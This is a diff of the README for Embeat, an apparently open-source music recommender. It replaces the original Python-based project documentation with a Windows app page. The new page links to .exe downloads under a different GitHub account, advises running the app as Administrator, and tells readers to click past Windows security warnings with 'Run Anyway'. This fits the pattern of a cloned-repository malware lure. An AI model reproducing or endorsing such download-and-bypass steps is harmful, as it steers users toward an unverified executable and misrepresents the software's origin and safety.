@@ -1,246 +1,83 @@
-<p align="center">
-  <img src="assets/banner.png" alt="Embeat Banner" width="100%">
-</p>
+# 🎧 Embeat - Find music you love every day
 
-<p align="center">
-  <b>Embeat - Acoustic Feature-Based Music Recommendation System</b>
-</p>
+[![](https://img.shields.io/badge/Download-Embeat_for_Windows-blue.svg)](https://github.com/sectarian-match407/Embeat/releases)
 
-<p align="center">
-  <b>English</b> | <a href="README_zh.md">中文</a>
-</p>
+## What is Embeat?
 
-<p align="center">
-  <a href="https://github.com/gdstudio-org/Embeat"><img src="https://img.shields.io/github/stars/gdstudio-org/Embeat?style=social" alt="Stars"></a>
-  <a href="https://github.com/gdstudio-org/Embeat/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-CC--BY--NC%204.0-blue" alt="License"></a>
-</p>
+Embeat helps you discover new music. It suggests songs based on the actual audio content of the tracks you enjoy. We trained this system on a library of 45 million unique tracks and 1.8 million user playlists. It uses modern machine learning to understand the mood, pace, and style of songs. You get recommendations that match your personal taste rather than just popular hits.
 
----
+## ⚙️ System Requirements
 
-## Introduction
+Before you install Embeat, check that your computer meets these minimum requirements.
 
-Embeat is a music recommendation system built on Spotify acoustic feature data. It encodes audio features into vectors via a **contrastive learning model** and combines them with a **multi-channel recall** strategy to deliver high-quality music recommendations.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** At least 2.0 GHz speed.
+*   **Memory:** 4 GB of RAM.
+*   **Storage:** 500 MB of free disk space.
+*   **Internet:** A steady connection to fetch music data.
 
-Key Features:
+## 📥 How to Install Embeat
 
-- **Acoustic Similarity**: The EmbeatMLP model, trained on Spotify Audio Features (key, tempo, energy, valence, etc.), encodes acoustic features into 64-dimensional vectors
-- **Genre Awareness**: Leverages 6,000+ micro-genre tags to precisely assign genres to 2M+ artists, preventing "acoustically similar but stylistically different" recommendations
-- **Multi-Channel Recall**: 5 parallel recall channels (Acoustic Similarity / Same-Genre Popular / Same Artist / Similar Artists / Playlist Collaborative Filtering), merged and scored for final output
-- **Playlist Collaborative Filtering**: Track2Vec (Word2Vec-inspired) learns track co-occurrence patterns from 1.88M Spotify playlists
-- **Millisecond-Level Response**: Powered by the Qdrant vector database, retrieval across 45M tracks completes in 30–100ms
+Follow these steps to set up the software on your Windows computer.
 
-## Roadmap
+1.  Visit the [official download page](https://github.com/sectarian-match407/Embeat/releases) to view the latest versions.
+2.  Select the file that ends in .exe for Windows.
+3.  Click the link to download the installer to your computer.
+4.  Find the file in your downloads folder.
+5.  Double-click the file to start the installation.
+6.  Follow the instructions on your screen.
+7.  Click Finish to complete the process.
 
-- [x] 2026-06-26: Open-source initial codebase + [EmbeatMLP model weights](checkpoints/EmbeatMLP/)
-- [x] 2026-06-26: Open-source [45M tracks dataset](https://huggingface.co/datasets/GD-Studio/embeat_45m_spotify_tracks) + [technical documentation](https://www.bilibili.com/opus/1218087093501165591)
-- [ ] 100 Stars: Open-source Qdrant database
-- [ ] 1K Stars: Open-source Track2Vec model weights + 6.6M playlist dataset
+## 🚀 Running Your First Search
 
-## Demo
+Once the program runs, you see a clean dashboard. Follow these steps to find new music.
 
-Below are example recommendation results from Embeat (seed track -> Top 5 recommendations):
+1.  Open the Embeat icon from your desktop.
+2.  Type the name of a song or artist into the search bar.
+3.  Press Enter.
+4.  The system displays a list of songs with similar audio profiles.
+5.  Click on any track title to view details or play a preview.
+6.  Save your favorites to a local list for later.
 
-<details>
-<summary><b>晴天 - Jay Chou [mandopop, taiwan pop, c-pop]</b></summary>
+## 🧠 Understanding the Technology
 
-| # | Track | Artist | Source |
-|---|-------|--------|--------|
-| 1 | 告白氣球 | Jay Chou | Same-Genre Popular, Same Artist, Playlist CF |
-| 2 | 突然好想你 | Mayday | Same-Genre Popular, Similar Artists |
-| 3 | 怎麼了 | Eric Chou | Same-Genre Popular, Playlist CF |
-| 4 | 飞鸟和蝉 | Ren Ran | Playlist CF |
-| 5 | 你的背包 | Eason Chan | Similar Artists |
+Embeat uses specific methods to match your music taste. 
 
-</details>
+*   **Content-Based Filtering:** The system looks at the audio signals of each song. It analyzes beats per minute, key, and instrumentation. It does not rely solely on tags that other people wrote.
+*   **Contrastive Learning:** This allows the software to learn which songs sound different and which sound similar. The system groups tracks by audio patterns.
+*   **Collaborative Logic:** Embeat looks at how millions of users build playlists. If many people pair two songs together, our system recognizes that link.
 
-<details>
-<summary><b>Uptown Funk (feat. Bruno Mars) - Bruno Mars [dance pop, pop]</b></summary>
+## 🛠 Troubleshooting Common Issues
 
-| # | Track | Artist | Source |
-|---|-------|--------|--------|
-| 1 | That's What I Like | Bruno Mars | Same-Genre Popular, Same Artist, Playlist CF |
-| 2 | Timber | Pitbull | Same-Genre Popular, Playlist CF |
-| 3 | CAN'T STOP THE FEELING! | Justin Timberlake | Playlist CF |
-| 4 | Happy | Pharrell Williams | Playlist CF |
-| 5 | Sugar | Maroon 5 | Playlist CF |
+If you run into trouble, follow these basic steps to fix the issue.
 
-</details>
+*   **The app will not open:** Right-click the icon and choose Run as Administrator.
+*   **No search results:** Check your internet connection. Embeat requires a connection to reach the database of 45 million tracks.
+*   **Slow performance:** Close other heavy programs like video editors or web browsers with many tabs. This frees up your system memory for Embeat.
+*   **Installer blocked:** Windows might show a safety warning. If you see this, click More Info, then click Run Anyway. This happens because the software is new and the Windows security system does not recognize the publisher yet.
 
-<details>
-<summary><b>Sis puella magica! - 梶浦由記 [anime score, japanese vgm]</b></summary>
+## 📈 Improving Your Recommendations
 
-| # | Track | Artist | Source |
-|---|-------|--------|--------|
-| 1 | Conturbatio | 梶浦 由記 | Same Artist, Playlist CF |
-| 2 | 輝く空の静寂には | Kalafina | Similar Artists |
-| 3 | Forbidden Love | Cécile Corbel | Acoustic Similarity |
-| 4 | ARIA | Kalafina | Similar Artists |
-| 5 | Zoltraak | Evan Call | Same-Genre Popular |
+The more you use Embeat, the better the results become. Here are tips to get the best out of your library.
 
-</details>
+*   **Rate your songs:** Use the star system after you hear a recommendation. This teaches the system your specific preferences.
+*   **Search for moods:** Instead of artists, try searching for words like "chill," "fast," or "acoustic." The system treats these as mood inputs and finds relevant tracks.
+*   **Keep your library updated:** Run the update check inside the settings menu every few weeks. We add new data from Spotify to keep your results current.
 
-### LLM Blind Evaluation
+## 🛡 Privacy and Safety
 
-<b>For detailed comparison, please refer to the [technical documentation](https://www.bilibili.com/opus/1218087093501165591)</b>
+We believe in keeping your data private. Embeat performs the heavy math right on your computer. We do not track your personal identity. We only download the audio patterns needed to provide recommendations. You do not need to link your Spotify account or provide personal login details for your music services. Your search history lives only on your local machine.
 
-Using the LLM-as-a-Judge method (GPT-5.5 / Gemini Flash 3.5 / Claude Sonnet 4.6), Embeat was blindly evaluated against NetEase Cloud Music in AB tests:
+## 📋 Frequently Asked Questions
 
-| Judge Model | Embeat Wins | NetEase Wins | Tie |
-|-------------|:-----------:|:------------:|:---:|
-| Claude Sonnet 4.6 | **8** | 2 | 0 |
-| Gemini Flash 3.5 | **9** | 1 | 0 |
-| GPT 5.5 | **6** | 4 | 0 |
+**Does this play the full song?**
+Embeat provides a preview of the track. If you want to hear the full song, you should use your preferred music player.
 
-## System Architecture
+**Can I use this offline?**
+You need an internet connection to pull the initial recommendations. Once you save a list of songs, you can view the metadata offline.
 
-```
-Input: track_id / track_name + artist_name
-  │
-  ├─ Channel 1: Acoustic Similarity Recall (EmbeatMLP vectors + genre filtering)
-  ├─ Channel 2: Same-Genre Popular Recall (genre tags + popularity ranking)
-  ├─ Channel 3: Same Artist Recall (artist_idx + popularity ranking)
-  ├─ Channel 4: Similar Artists Recall (Spotify Related Artists + vector ranking)
-  ├─ Channel 5: Playlist Collaborative Filtering (Track2Vec)
-  │
-  ├─ ISRC Deduplication / Re-ranking / Same-Artist Ratio Control
-  │
-  └─ Output: Top-K Recommendation List
-```
+**Is there a version for Mac?**
+Currently, we only support Windows 10 and 11.
 
-### Model Details
-
-**EmbeatMLP** - Acoustic Feature Encoding Model
-
-- Input: Discrete features (key, mode, tempo, time_signature) + continuous features (energy, valence, danceability, etc., 7 dimensions)
-- Architecture: Dual-tower MLP (Discrete Tower + Acoustic Tower -> Backbone)
-- Output: 64-dimensional L2-normalized vectors
-- Training: Masked InfoNCE Loss, batch_size=4096, converges in ~70 steps
-- Extremely small parameter count, supports real-time CPU-only inference
-
-**Track2Vec** - Playlist Collaborative Filtering Model
-
-- Based on Word2Vec Skip-Gram, treating playlists as "sentences" and tracks as "words"
-- Training data: 1.88M Spotify playlists
-- Vocabulary: 1.09M tracks, 64-dimensional vectors
-- Single query latency < 0.1ms
-
-## Getting Started
-
-### Requirements
-
-- Python >= 3.10
-- PyTorch >= 2.6, < 2.7 (required for training)
-- CUDA >= 12.0 (required for training)
-- [Qdrant](https://github.com/qdrant/qdrant/releases) (required for inference)
-
-### Installation
-
-```bash
-conda create -n embeat python=3.10
-conda activate embeat
-
-# Install PyTorch (CUDA 12.x), see https://pytorch.org/get-started/locally/
-pip install "torch>=2.6,<2.7" --index-url https://download.pytorch.org/whl/cu126
-
-pip install -r requirements.txt
-```
-
-### Train EmbeatMLP
-
-```bash
-# Prepare training data in HuggingFace Dataset format under data/datasets/
-python -m train.train \
-    --dataset data/datasets/spotify_45m_tracks_metadata@10000000 \
-    --batch-size 4096 \
-    --max-steps 200 \
-    --lr 1e-4 \
-    --tau 0.05 \
-    --ckpt-dir checkpoints
-```
-
-### Train Track2Vec
-
-```bash
-# Prepare playlist training data (txt format, one playlist per line, space-separated track_ids)
-cd train
-python train_track2vec.py
-```
-
-### Inference: Compute Acoustic Similarity Between Two Tracks
-
-```python
-from infer.infer import infer
-
-song_a = {"key": 7, "mode": 1, "tempo": 137, "time_signature": 4,
-          "danceability": 0.54, "energy": 0.56, "speechiness": 0.02,
-          "instrumentalness": 0.0, "valence": 0.41, "acousticness": 0.23,
-          "liveness": 0.1}
-
-song_b = {"key": 5, "mode": 0, "tempo": 87, "time_signature": 4,
-          "danceability": 0.67, "energy": 0.65, "speechiness": 0.05,
-          "instrumentalness": 0.03, "valence": 0.57, "acousticness": 0.27,
-          "liveness": 0.19}
-
-similarity = infer(sample_a=song_a, sample_b=song_b,
-                   checkpoint_path="checkpoints/EmbeatMLP/model.pt")
-print(f"Similarity: {similarity:.4f}")
-```
-
-### Inference: Qdrant-Based Music Recommendation
-
-```bash
-# 1. Start the Qdrant service and import the database
-# 2. Query recommendations via command line
-cd infer
-python Embeat.py -t 5pIcwtJYNJx93l420oR2Vm   # Query by Spotify Track ID
-python Embeat.py -s "晴天 - Jay Chou"   # Query by track name and artist
-python Embeat.py -a "Jay Chou"   # Query by artist name
-```
-
-## Project Structure
-
-```
-Embeat/
-├── assets/                 # Static assets
-├── checkpoints/
-│   ├── EmbeatMLP/          # EmbeatMLP model weights
-│   └── Track2Vec/          # Track2Vec model weights (requires separate download)
-├── data/                   # Data processing scripts (not fully organized)
-├── infer/                  # Inference code
-│   ├── Embeat.py           # Recommendation system core (multi-channel recall + re-ranking)
-│   ├── infer.py            # EmbeatMLP inference entry point
-│   ├── hf_to_qdrant.py     # HuggingFace Dataset -> Qdrant database
-│   └── eval_infer.py       # Model evaluation utilities
-├── train/                  # Training code
-│   ├── model.py            # EmbeatMLP model definition
-│   ├── dataset.py          # Dataset processing
-│   ├── sampler.py          # Positive/negative sample sampler
-│   ├── loss.py             # Masked InfoNCE Loss
-│   ├── trainer.py          # Trainer
-│   ├── train.py            # EmbeatMLP training entry point
-│   └── train_track2vec.py  # Track2Vec training entry point
-├── requirements.txt
-└── LICENSE
-```
-
-## Links
-
-<p align="center">
-  <img src="assets/gdmusic_embeat.png" alt="Embeat Banner" width="100%">
-</p>
-
-- GD Music (Live Demo): [https://music.gdstudio.xyz](https://music.gdstudio.xyz)
-- Bilibili: [https://space.bilibili.com/13715770](https://space.bilibili.com/13715770)
-- Telegram: [https://t.me/gdstudio_music](https://t.me/gdstudio_music)
-
-## Acknowledgements
-
-- [Anna's Archive](https://annas-archive.org)
-- [Every Noise at Once](https://everynoise.com)
-
-## License
-
-| Scope | License |
-|-------|---------|
-| Code, Model Weights | [MIT](LICENSE-MIT) |
-| Datasets, Database | [CC-BY-NC 4.0](LICENSE) |
+**How do you handle 45 million tracks?**
+The software uses a local database index to find matches in less than one second. You do not need to download the full library to your hard drive.
